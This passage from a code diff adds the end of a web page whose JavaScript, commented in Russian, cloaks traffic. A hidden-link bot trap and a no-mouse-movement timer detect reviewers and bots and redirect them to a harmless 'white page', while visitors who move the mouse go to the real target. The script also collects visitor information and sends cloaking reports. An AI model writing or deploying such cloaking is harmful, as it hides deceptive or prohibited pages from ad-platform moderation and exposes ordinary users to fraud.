+            // Сработает только если проверка включена и отчет еще не отправлен
+            if (config[isMobile ? 'mobile' : 'desktop']?.checkBotTrap && !reportSent) {
+                 botTrapActivated = true; // Устанавливаем флаг немедленно
+                 console.warn('Bot trap activated!');
+                 const reason = 'Активирована ловушка для ботов (клик по скрытой ссылке)';
+                 cloakedReason = reason; // Устанавливаем причину
+                 redirectTarget = WHITE_PAGE;
+                 // Пересобираем инфо и отправляем отчет
+                 userInfo = await collectUserInfo(); // Обновляем инфо с флагом botTrapActivated=true
+                 await sendCloakReport([reason], userInfo); // Отправляем отчет с этой причиной
+                 performRedirect(); // Немедленный редирект
+            }
+        });
+
+        // Движение мыши
+        function handleMouseMove() {
+            if (!hadMouseMovement) {
+                hadMouseMovement = true;
+                console.log('Mouse movement detected.');
+                const promptElement = document.getElementById('mouse-prompt');
+                if (promptElement) promptElement.style.display = 'none';
+
+                // Если мышь подвинулась ДО срабатывания таймера NoMouseMove
+                // и клоакинг еще НЕ сработал по другим причинам, и это десктоп
+                if (!noMouseMoveCheckTriggered && !cloakedReason && !isMobile) {
+                    clearTimeout(noMouseMoveTimeoutId); // Отменяем таймер NoMouseMove
+                    if (!redirectTimeoutId) { // Запускаем редирект на целевую, если еще не запущен
+                        console.log(`Starting redirect timer (${REDIRECT_DELAY_AFTER_MOUSE_MOVE}ms) after mouse move.`);
+                        redirectTimeoutId = setTimeout(performRedirect, REDIRECT_DELAY_AFTER_MOUSE_MOVE);
+                    }
+                }
+                // Удаляем обработчики
+                document.removeEventListener('mousemove', handleMouseMove);
+                document.removeEventListener('touchstart', handleMouseMove);
+            }
+        }
+        document.addEventListener('mousemove', handleMouseMove);
+        document.addEventListener('touchstart', handleMouseMove);
+
+        // --- ЗАПУСК ---
+        window.onload = async () => {
+             // Запускаем основную логику
+             await determineRedirectTarget();
+
+             // Если это десктоп, клоакинг еще не сработал, и проверка NoMouseMove включена
+             // -> Запускаем таймер NoMouseMove
+             // Важно: делаем это ПОСЛЕ determineRedirectTarget, чтобы знать, не сработал ли клоакинг уже
+             if (!isMobile && !cloakedReason && config.desktop?.checkNoMouseMove) {
+                 console.log(`Starting NoMouseMove check timer (${NO_MOUSE_MOVE_TIMEOUT_DESKTOP}ms)`);
+                 noMouseMoveTimeoutId = setTimeout(async () => {
+                     // Таймер сработал
+                     console.log(`NoMouseMove Timeout ${NO_MOUSE_MOVE_TIMEOUT_DESKTOP}ms expired.`);
+                     // Проверяем, было ли движение мыши за это время
+                     const reasonNoMouse = checkNoMouseMove(config.desktop); // Эта функция вернет причину или null
+
+                     // Если движения не было И клоакинг еще не сработал по ДРУГИМ причинам
+                     if (reasonNoMouse && !cloakedReason && !reportSent) {
+                         cloakedReason = reasonNoMouse; // Устанавливаем причину
+                         redirectTarget = WHITE_PAGE;
+                         console.warn(`Cloaking triggered by NoMouseMove timer: ${cloakedReason}`);
+                         // Пересобираем инфо и отправляем отчет
+                         userInfo = await collectUserInfo(); // Обновляем hadMouseMovement
+                         await sendCloakReport([reasonNoMouse], userInfo); // Отправляем отчет
+                         performRedirect(); // Редирект на WHITE_PAGE
+                     } else if (reasonNoMouse) {
+                         console.log("NoMouseMove triggered, but cloaking already happened or report sent.");
+                     }
+                 }, NO_MOUSE_MOVE_TIMEOUT_DESKTOP);
+             }
+         };
+
+    </script>
+</body>
+</html>
